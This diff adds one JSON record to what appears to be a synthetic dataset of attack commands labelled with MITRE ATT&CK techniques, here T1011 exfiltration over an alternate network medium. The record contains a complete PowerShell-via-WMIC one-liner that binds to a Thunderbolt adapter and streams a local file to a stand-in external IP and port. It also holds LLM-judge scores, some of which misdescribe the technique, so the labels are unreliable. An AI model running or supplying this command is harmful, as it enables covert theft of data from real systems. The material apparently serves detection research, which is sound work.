@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
+  "explanation": "Invokes PowerShell via WMIC to bind to a Thunderbolt network adapter and send data over TCP to a non-standard port. Thunderbolt networking is used as an alternate medium to the primary network per T1011.",
+  "rationale_steps": [
+    "Locate a Thunderbolt NIC via WMI adapter description.",
+    "Bind a TCP client to the Thunderbolt interface's IPv4 address.",
+    "Connect to an external destination using a high, uncommon port.",
+    "Exfiltrate data over the Thunderbolt network path.",
+    "No persistent or system-wide network reconfiguration is performed."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-987933e0-4e9ac17f",
+  "source_prompt_hash": "987933e0",
+  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, parentheses, and braces, correct PowerShell syntax with appropriate variable declarations, and proper escape sequences for nested command execution via WMIC.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does attempt to exfiltrate data over a network connection, it doesn't align with T1011 (Exfiltration Over Other Network Medium) as it's using a standard TCP connection over an existing network adapter rather than establishing accounts as described in the technique.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T10:15:55.120119Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct `wmic` and PowerShell syntax, balanced quotes/parentheses, and appropriate backtick escaping for PowerShell variables within the string.",
+        "semantic_score": 1,
+        "semantic_justification": "The command's actions (network communication over a specific interface) are entirely misaligned with the claimed MITRE ATT&CK T1011 (Establish Accounts), which pertains to account creation and manipulation, not network exfiltration or C2 over alternate media, and the 'Privilege: None' claim is inconsistent with the `TcpClient.Client.Bind` operation.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T10:16:07.666733Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 2,
+        "syntactic_justification": "Balanced quoting and structure exist, but the pervasive use of backticks before PowerShell variables (e.g., `$ifc, `$_) will break parsing and likely cause the command to fail.",
+        "semantic_score": 3,
+        "semantic_justification": "The logic intends to exfiltrate data by binding a TCP client to a Thunderbolt NIC (aligned with T1011\u2019s alternate medium concept), but execution would fail due to escaping errors and it does not align with the provided 'Establish Accounts' description.",
+        "combined_score": 2.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-02T10:16:40.844034Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 2.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
